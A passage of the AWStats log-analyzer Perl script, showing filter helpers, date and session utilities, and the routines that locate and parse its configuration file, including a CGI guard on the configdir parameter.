array\n# Parameters:\tip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipDNSLookup {\n\tforeach (@SkipDNSLookupFor) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipDNSLookupFor\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipHosts array\n# Parameters:\thost @SkipHosts (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipHost {\n\tforeach (@SkipHosts) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipHosts\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipReferrers array\n# Parameters:\thost @SkipReferrers (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipReferrer {\n\tforeach (@SkipReferrers) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipReferrers\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipUserAgents array\n# Parameters:\tuseragent @SkipUserAgents (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipUserAgent {\n\tforeach (@SkipUserAgents) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipUserAgent\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipFiles array\n# Parameters:\turl @SkipFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipFile {\n\tforeach (@SkipFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyHosts array\n# Parameters:\thost @OnlyHosts (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyHost {\n\tforeach (@OnlyHosts) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyHosts\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyUsers array\n# Parameters:\thost @OnlyUsers (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyUser {\n\tforeach (@OnlyUsers) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyUsers\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyUserAgents array\n# Parameters:\tuseragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyUserAgent {\n\tforeach (@OnlyUserAgents) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyUserAgents\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in NotPageFiles array\n# Parameters:\turl @NotPageFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub NotPageFile {\n\tforeach (@NotPageFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @NotPageFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyFiles array\n# Parameters:\turl @OnlyFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyFile {\n\tforeach (@OnlyFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return day of week of a day\n# Parameters:\t$day $month $year\n# Return:\t\t0-6\n#------------------------------------------------------------------------------\nsub DayOfWeek {\n\tmy ( $day, $month, $year ) = @_;\n\tif ($Debug) { debug( \"DayOfWeek for $day $month $year\", 4 ); }\n\tif ( $month < 3 ) { $month += 10; $year--; }\n\telse { $month -= 2; }\n\tmy $cent = sprintf( \"%1i\", ( $year / 100 ) );\n\tmy $y    = ( $year % 100 );\n\tmy $dw   = (\n\t\tsprintf( \"%1i\", ( 2.6 * $month ) - 0.2 ) + $day + $y +\n\t\t  sprintf( \"%1i\", ( $y / 4 ) ) + sprintf( \"%1i\", ( $cent / 4 ) ) -\n\t\t  ( 2 * $cent ) ) % 7;\n\t$dw += 7 if ( $dw < 0 );\n\tif ($Debug) { debug( \" is $dw\", 4 ); }\n\treturn $dw;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return 1 if a date exists\n# Parameters:\t$day $month $year\n# Return:\t\t1 if date exists else 0\n#------------------------------------------------------------------------------\nsub DateIsValid {\n\tmy ( $day, $month, $year ) = @_;\n\tif ($Debug) { debug( \"DateIsValid for $day $month $year\", 4 ); }\n\tif ( $day < 1 )  { return 0; }\n\tif ( $day > 31 ) { return 0; }\n\tif ( $month == 4 || $month == 6 || $month == 9 || $month == 11 ) {\n\t\tif ( $day > 30 ) { return 0; }\n\t}\n\telsif ( $month == 2 ) {\n\t\tmy $leapyear = ( $year % 4 == 0 ? 1 : 0 );   # A leap year every 4 years\n\t\tif ( $year % 100 == 0 && $year % 400 != 0 ) {\n\t\t\t$leapyear = 0;\n\t\t}    # Except if year is 100x and not 400x\n\t\tif ( $day > ( 28 + $leapyear ) ) { return 0; }\n\t}\n\treturn 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return string of visit duration\n# Parameters:\t$starttime $endtime\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tA string from $SessionsRange[0..6] that identify the visit duration range\n#------------------------------------------------------------------------------\nsub GetSessionRange {\n\tmy $param1=shift;\n\tmy $param2=shift;\n\n\t# skip unneeded calculations if its the same\n\tif ($param1 == $param2) { return $SessionsRange[0]; }\n\n\tmy $starttime;\n\tmy $endtime;\n\n\teval {\n\t\t#safety to prevent Time::Local causing termination on invalid data\n\t\t#Ex: Second '84' out of range 0..59 at /xxx/awstats.pl\n\t\tif ($param1 =~ /$regdate/o) { $starttime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }\n\t\tif ($param2 =~ /$regdate/o) { $endtime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }\n\t};\n\t\n\tmy $delay = $endtime - $starttime;\n\tif ($Debug) {\n\t\tdebug( \"GetSessionRange $endtime - $starttime = $delay\", 4 );\n\t}\n\tif ( $delay <= 30 )   { return $SessionsRange[0]; }\n\tif ( $delay <= 120 )  { return $SessionsRange[1]; }\n\tif ( $delay <= 300 )  { return $SessionsRange[2]; }\n\tif ( $delay <= 900 )  { return $SessionsRange[3]; }\n\tif ( $delay <= 1800 ) { return $SessionsRange[4]; }\n\tif ( $delay <= 3600 ) { return $SessionsRange[5]; }\n\treturn $SessionsRange[6];\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return string with just the extension of a file in the URL\n# Parameters:\t$regext, $url without query string\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tA lowercase string with the name of the extension, e.g. \"html\"\n#------------------------------------------------------------------------------\nsub Get_Extension{\n\tmy $extension;\n\tmy $regext = shift;\n\tmy $urlwithnoquery = shift;\n\tif ( $urlwithnoquery =~ /$regext/o\n\t\t|| ( $urlwithnoquery =~ /[\\\\\\/]$/ && $DefaultFile[0] =~ /$regext/o )\n\t  )\n\t{\n\t\t$extension =\n\t\t  ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )\n\t\t  ? lc($1)\n\t\t  : 'Unknown';\n\t}\n\telse {\n\t\t$extension = 'Unknown';\n\t}\t\n\treturn $extension;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Returns just the file of the url\n# Parameters:\t-\n# Input:        $url\n# Output:\t\tString with the file name\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Get_Filename{\n\tmy $temp = shift;\n\tmy $idx = -1;\n\t# check for slash\n\t$idx = rindex($temp, \"/\");\n\tif ($idx > -1){ $temp = substr($temp, $idx+1);}\n\telse{ \n\t\t$idx = rindex($temp, \"\\\\\");\n\t\tif ($idx > -1){ $temp = substr($temp, $idx+1);}\n\t}\n\treturn $temp;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Compare two browsers version\n# Parameters:\t$a\n# Input:        None\n# Output:\t\tNone\n# Return:\t\t-1, 0, 1\n#------------------------------------------------------------------------------\nsub SortBrowsers {\n\tmy $a_family = $a;\n\tmy @a_ver    = ();\n\tforeach my $family ( keys %BrowsersFamily ) {\n\t\tif ( $a =~ /^$family/i ) {\n\t\t\t$a =~ m/^(\\D+)([\\d\\.]+)?$/;\n\t\t\t$a_family = $1;\n\t\t\t@a_ver = split( /\\./, $2 );\n\t\t}\n\t}\n\tmy $b_family = $b;\n\tmy @b_ver    = ();\n\tforeach my $family ( keys %BrowsersFamily ) {\n\t\tif ( $b =~ /^$family/i ) {\n\t\t\t$b =~ m/^(\\D+)([\\d\\.]+)?$/;\n\t\t\t$b_family = $1;\n\t\t\t@b_ver = split( /\\./, $2 );\n\t\t}\n\t}\n\n\tmy $compare = 0;\n\tmy $done    = 0;\n\n\t$compare = $a_family cmp $b_family;\n\tif ( $compare != 0 ) {\n\t\treturn $compare;\n\t}\n\n\twhile ( !$done ) {\n\t\tmy $a_num = shift @a_ver || 0;\n\t\tmy $b_num = shift @b_ver || 0;\n\n\t\t$compare = $a_num <=> $b_num;\n\t\tif ( $compare != 0\n\t\t\t|| ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )\n\t\t{\n\t\t\t$done = 1;\n\t\t}\n\t}\n\n\treturn $compare;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Read config file\n# Parameters:\tNone or configdir to scan\n# Input:        $DIR $PROG $SiteConfig\n# Output:\t\tGlobal variables\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Read_Config {\n\n\t# Check config file in common possible directories :\n\t# Windows :                   \t\t\t\t\"$DIR\" (same dir than awstats.pl)\n\t# Standard, Mandrake and Debian package :\t\"/etc/awstats\"\n\t# Other possible directories :\t\t\t\t\"/usr/local/etc/awstats\", \"/etc\"\n\t# FHS standard, Suse package : \t\t\t\t\"/etc/opt/awstats\"\n\tmy $configdir         = shift;\n\tmy @PossibleConfigDir = (\n\t\t\t\"$DIR\",\n\t\t\t\"/etc/awstats\",\n\t\t\t\"/usr/local/etc/awstats\", \"/etc\",\n\t\t\t\"/etc/opt/awstats\"\n\t\t); \n\n\tif ($configdir) {\n\t\t# Check if configdir is outside default values.\n\t\tmy $outsidedefaultvalue=1;\n\t\tforeach (@PossibleConfigDir) {\n\t\t\tif ($_ eq $configdir) { $outsidedefaultvalue=0; last; }\n\t\t}\n\n\t\t# If from CGI, overwriting of configdir with a value that differs from a default value\n\t\t# is only possible if AWSTATS_ENABLE_CONFIG_DIR defined.\n\t\t# AWSTATS_ENABLE_CONFIG_DIR must contains dir allowed\n\t\tif ($ENV{'GATEWAY_INTERFACE'} && $outsidedefaultvalue)\n\t\t{\n\t\t\tif (! $ENV{\"AWSTATS_ENABLE_CONFIG_DIR\"})\n\t\t\t{\n\t\t\t\terror(\"Sorry, to allow overwriting of configdir parameter, from an AWStats CGI page, with a non default value, environment variable AWSTATS_ENABLE_CONFIG_DIR must be set to full path of allowed directory. For example, by adding the line 'SetEnv AWSTATS_ENABLE_CONFIG_DIR /mydirofconf' in your Apache config file or into a .htaccess file.\");\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ($configdir !~ $ENV{\"AWSTATS_ENABLE_CONFIG_DIR\"})\n\t\t\t\t{\n\t\t\t\t\terror(\"Sorry, using configdir parameter from an AWStats CGI page is possible only if parameter configdir is a directory defined into environment variable AWSTATS_ENABLE_CONFIG_DIR\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t@PossibleConfigDir = (\"$configdir\");\n\t}\n\n\t# Open config file\n\t$FileConfig = $FileSuffix = '';\n\tforeach (@PossibleConfigDir) {\n\t\tmy $searchdir = $_;\n\t\tif ( $searchdir && $searchdir !~ /[\\\\\\/]$/ ) { $searchdir .= \"/\"; }\n\t\t\n\t\tif ( -f $searchdir.$PROG.\".\".$SiteConfig.\".conf\" &&  open( CONFIG, \"<$searchdir$PROG.$SiteConfig.conf\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$PROG.$SiteConfig.conf\";\n\t\t\t$FileSuffix = \".$SiteConfig\";\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$PROG.$SiteConfig.conf\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$PROG.$SiteConfig.conf\", 2);}}\n\t\t\n\t\tif ( -f $searchdir.$PROG.\".conf\" &&  open( CONFIG, \"$searchdir$PROG.conf\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$PROG.conf\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$PROG.conf\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$PROG.conf\", 2);}}\n\t\t\n\t\t# Added to open config if file name is passed to awstats \n\t\tif ( -f $searchdir.$SiteConfig && open( CONFIG, \"$searchdir$SiteConfig\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$SiteConfig\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$SiteConfig\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$SiteConfig\", 2);}}\n\t}\n\t\n\t#CL - Added to open config if full path is passed to awstats \n\tif ( !$FileConfig ) {\n\t\t\n\t\tmy $SiteConfigBis = File::Spec->rel2abs($SiteConfig);\n\t\tdebug(\"Finally, try to open an absolute path : $SiteConfigBis\", 2);\n\t\n\t\tif ( -f $SiteConfigBis && open(CONFIG, \"$SiteConfigBis\")) {\n\t\t\t$FileConfig = \"$SiteConfigBis\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $SiteConfigBis\", 2);}\n\t\t\t$SiteConfig=$SiteConfigBis;\n\t\t}\n\t\telse {\n\t\t\tif ($Debug){debug(\"Unable to open config file: $SiteConfigBis\", 2);}\n\t\t}\n\t}\n\t\n\tif ( !$FileConfig ) {\n\t\tif ($DEBUGFORCED || !$ENV{'GATEWAY_INTERFACE'}){\n\t\terror(\n\"Couldn't open config file \\\"$PROG.$SiteConfig.conf\\\", nor \\\"$PROG.conf\\\", nor \\\"$SiteConfig\\\" after searching in path \\\"\"\n\t\t\t  . join( ', ', @PossibleConfigDir )\n\t\t\t  . \", $SiteConfig\\\": $!\" );\n\t\t}else{error(\"Couldn't open config file \\\"$PROG.$SiteConfig.conf\\\" nor \\\"$PROG.conf\\\". \n\t\tPlease read the documentation for directories where the configuration file should be located.\"); }\n\t}\n\n\t# Analyze config file content and close it\n\t&Parse_Config( *CONFIG, 1, $FileConfig );\n\tclose CONFIG;\n\n\t# If parameter NotPageList not found, init for backward compatibility\n\tif ( !$FoundNotPageList ) {\n\t\t%NotPageList = (\n\t\t\t'css'   => 1,\n\t\t\t'js'    => 1,\n\t\t\t'class' => 1,\n\t\t\t'gif'   => 1,\n\t\t\t'jpg'   => 1,\n\t\t\t'jpeg'  => 1,\n\t\t\t'png'   => 1,\n\t\t\t'bmp'   => 1,\n\t\t\t'ico'   => 1,\n\t\t\t'swf'   => 1\n\t\t);\n\t}\n\n\t# If parameter ValidHTTPCodes empty, init for backward compatibility\n\tif ( !scalar keys %ValidHTTPCodes ) {\n\t\t$ValidHTTPCodes{\"200\"} = $ValidHTTPCodes{\"304\"} = 1;\n\t}\n\n\t# If parameter ValidSMTPCodes empty, init for backward compatibility\n\tif ( !scalar keys %ValidSMTPCodes ) {\n\t\t$ValidSMTPCodes{\"1\"} = $ValidSMTPCodes{\"250\"} = 1;\n\t}\n\n\t# If parameter TrapInfosForHTTPErrorCodes empty, init to default\n\tif ( !scalar keys %TrapInfosForHTTPErrorCodes ) {\n\t\t$TrapInfosForHTTPErrorCodes{\"404\"} = 1;\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Parse content of a config file\n# Parameters:\topened file handle, depth level, file name\n# Input:        -\n# Output:\t\tGlobal variables\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Parse_Config {\n\tmy ($confighandle) = $_[0];\n\tmy $level          = $_[1];\n\tmy $configFile     = $_[2];\n\tmy $versionnum     = 0;\n\tmy $conflinenb     = 0;\n\n\tif ( $level > 10 ) {\n\t\terror(\n\"$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop).\"\n\t\t);\n\t}\n\n\twhile (<$confighandle>) {\n\t\tchomp $_;\n\t\ts/\\r//;\n\t\t$conflinenb++;\n\n\t\t# Extract version from first line\n\t\tif ( !$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\\d+).(\\d+)/i ) {\n\t\t\t$versionnum = ( $1 * 1000 ) + $2;\n\n\t\t\t#if ($Debug) { debug(\" Configure file version is $versionnum\",1); }\n\t\t\tnext;\n\t\t}\n\n\t\tif ( $_ =~ /^\\s*$/ ) { next; }\n\n\t\t# Check includes\n\t\tif ( $_ =~ /^Include \"([^\\\"]+)\"/ || $_ =~ /^#include \"([^\\\"]+)\"/ )\n\t\t{    # #include kept for backward compatibility\n\t\t\tmy $includeFile = $1;\n\n\t\t\t# Expand __var__ by values\n\t\t\twhile ( $includeFile =~ /__([^\\s_]+(?:_[^\\s_]+)*)__/ ) {\n\t\t\t\tmy $var = $1;\n\t\t\t\t$includeFile =~ s/__${var}__/$ENV{$var}/g;\n\t\t\t}\n\t\t\tif ($Debug) { debug( \"Found an include : $includeFile\", 2 ); }\n\t\t\tif ( $includeFile !~ /^([a-zA-Z]:)?[\\\\\\/]/ ) {\n\t\t\t\t# Correct relative include files\n\t\t\t\tif ( $FileConfig =~ /^(.*[\\\\\\/])[^\\\\\\/]*$/ ) {\n\t\t\t\t\t$includeFile = \"$1$includeFile\";\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( $level > 1 ) {\n\t\t\t\twarning(\n\"Warning: Perl versions before 5.6 cannot handle nested includes\"\n\t\t\t\t);\n\t\t\t\tnext;\n\t\t\t}\n            local( *CONFIG_INCLUDE );   # To avoid having parent file closed when include file is closed\n\t\t\tif ( open( CONFIG_INCLUDE, \"<$includeFile\" ) ) {\n\t\t\t\t&Parse_Config( *CONFIG_INCLUDE, $level + 1, $includeFile );\n\t\t\t\tclose(CONFIG_INCLUDE);\n\t\t\t}\n\t\t\telse {\n\t\t\t\terror(\"Could not open include file: $includeFile\");\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t# Remove comments\n\t\tif ( $_ =~ /^\\s*#/ ) { next; }\n\t\t$_ =~ s/\\s#.*$//;\n\n\t\t# Extract param and value\n\t\tmy ( $param, $value ) = split( /=/, $_, 2 );\n\t\t$param =~ s/^\\s+//;\n\t\t$param =~ s/\\s+$//;\n\n\t\t# If not a param=value, try with next line\n\t\tif ( !$param ) {\n\t\t\twarning(\n\"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored.\"\n\t\t\t);\n\t\t\tnext;\n\t\t}\n\t\tif ( !defined $value ) {\n\t\t\twarning(\n\"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored.\"\n\t\t\t);\n\t\t\tnext;\n\t\t}\n\n\t\tif ($value) {\n\t\t\t$value =~ s/^\\s+//;\n\t\t\t$value =~ s/\\s+$//;\n\t\t\t$value =~ s/^\\\"//;\n\t\t\t$value =~ s/\\\";?$//;\n\n\t\t\t# Replace __MONENV__ with value of environnement variable MONENV\n\t\t\t# Must be able to replace __VAR_1____VAR_2__\n\t\t\twhile ( $value =~ /__([^\\s_]+(?:_[^\\s_]+)*)__/ ) {\n\t\t\t\tmy $var = $1;\n\t\t\t\t$value =~ s/__${var}__/$ENV{$var}/g;\n\t\t\t}\n\t\t}\n\n\t\t# Initialize parameter for (param,value)\n\t\tif ( $param =~ /^LogFile/ ) {\n\t\t\tif ( $QueryString !~ /logfile=([^\\s&]+)/i ) { $LogFile = $value; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^DirIcons/ ) {\n\t\t\tif ( $QueryString !~ /diricons=([^\\s&]+)/i ) { $DirIcons = $value; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SiteDomain/ ) {\n\n\t\t\t# No regex test as SiteDomain is always exact value\n\t\t\t$SiteDomain = $value;\n\n  \t\t\tif ($SiteDomain =~ m/xn--/) \n  \t\t\t{\n\t\t\t\t# TODO Add code to test if IDNA::Punycode module is on\n\t\t\t\t#use IDNA::Punycode;\n\t\t\t\t$DecodePunycode=0;\t# Set to 1 if module is on\t\n  \t\t\t\tif ($DecodePunycode)\n  \t\t\t\t{\n\t                idn_prefix(undef);\n\t                my @parts = split(/\\./, $SiteDomain);\n\t                foreach (@parts) {\n\t                \tif ($_ =~ s/^xn--//) {\n\t                    \teval { $_ = decode_punycode($_); };\n\t                        if (my $e = $@) { $_ = $e; }\n\t                    }\n\t                }\n\t                $SiteDomain = join('.', @parts);\n  \t\t\t\t}\n            }\n                        \t\t\t\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^AddLinkToExternalCGIWrapper/ ) {\n\n\t\t\t# No regex test as AddLinkToExternalCGIWrapper is always exact value\n\t\t\t$AddLinkToExternalCGIWrapper = $value;\n\t\t\tnext;\n        }\n\t\tif ( $param =~ /^HostAliases/ ) {\n\t\t\t@HostAliases = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ s/^\\@// ) {    # If list of hostaliases in a file\n\t\t\t\t\topen( DATAFILE, \"<$elem\" )\n\t\t\t\t\t  || error(\n\"Failed to open file '$elem' declared in HostAliases parameter\"\n\t\t\t\t\t  );\n\t\t\t\t\tmy @val = map( /^(.*)$/i, <DATAFILE> );\n\t\t\t\t\tpush @HostAliases, map { qr/^$_$/i } @val;\n\t\t\t\t\tclose(DATAFILE);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\t\tif ($elem) { push @HostAliases, qr/$elem/i; }\n\t\t\t\t}\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t# Special optional setup params\n\t\tif ( $param =~ /^SkipDNSLookupFor/ ) {\n\t\t\t@SkipDNSLookupFor = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipDNSLookupFor, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^AllowAccessFromWebToFollowingAuthenticatedUsers/ ) {\n\t\t\t@AllowAccessFromWebToFollowingAuthenticatedUsers = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) {\n\t\t\t\tpush @AllowAccessFromWebToFollowingAuthenticatedUsers, $_;\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^DefaultFile/ ) {\n\t\t\t@DefaultFile = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\n\t\t\t\t# No REGEX for this option\n\t\t\t\t#if ($elem =~ /^REGEX\\[(.*)\\]$/i) { $elem=$1; }\n\t\t\t\t#else { $elem='^'.quotemeta($elem).'$'; }\n\t\t\t\tif ($elem) { push @DefaultFile, $elem; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipHosts/ ) {\n\t\t\t@SkipHosts = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipHosts, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipReferrersBlackList/ && $value ) {\n\t\t\topen( BLACKLIST, \"<$value\" )\n\t\t\t  || die \"Failed to open blacklist: $!\\n\";\n\t\t\twhile (<BLACKLIST>) {\n\t\t\t\tchomp;\n\t\t\t\tmy $elem = $_;\n\t\t\t\t$elem =~ s/ //;\n\t\t\t\t$elem =~ s/\\#.*//;\n\t\t\t\tif ($elem) { push @SkipReferrers, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t\tclose(BLACKLIST);\n\t\t}\n\t\tif ( $param =~ /^SkipUserAgents/ ) {\n\t\t\t@SkipUserAgents = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipUserAgents, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SkipFiles/ ) {\n\t\t\t@SkipFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @SkipFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyHosts/ ) {\n\t\t\t@OnlyHosts = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyHosts, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyUsers/ ) {\n\t\t\t@OnlyUsers = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyUsers, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyUserAgents/ ) {\n\t\t\t@OnlyUserAgents = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyUserAgents, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^OnlyFiles/ ) {\n\t\t\t@OnlyFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @OnlyFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^NotPageFiles/ ) {\n\t\t\t@NotPageFiles = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ /^REGEX\\[(.*)\\]$/i ) { $elem = $1; }\n\t\t\t\telse { $elem = '^' . quotemeta($elem) . '$'; }\n\t\t\t\tif ($elem) { push @NotPageFiles, qr/$elem/i; }\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^NotPageList/ ) {\n\t\t\t%NotPageList = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $NotPageList{$_} = 1; }\n\t\t\t$FoundNotPageList = 1;\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ValidHTTPCodes/ ) {\n\t\t\t%ValidHTTPCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $ValidHTTPCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^ValidSMTPCodes/ ) {\n\t\t\t%ValidSMTPCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $ValidSMTPCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^TrapInfosForHTTPErrorCodes/ ) {\n\t\t\t%TrapInfosForHTTPErrorCodes = ();\n\t\t\tforeach ( split( /\\s+/, $value ) ) { $TrapInfosForHTTPErrorCodes{$_} = 1; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^URLWithQueryWithOnlyFollowingParameters$/ ) {\n\t\t\t@URLWithQueryWithOnly = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^URLWithQueryWithoutFollowingParameters$/ ) {\n\t\t\t@URLWithQueryWithout = split( /\\s+/, $value );\n\t\t\tnext;\n\t\t}\n\n\t\t# Extra parameters\n\t\tif ( $param =~ 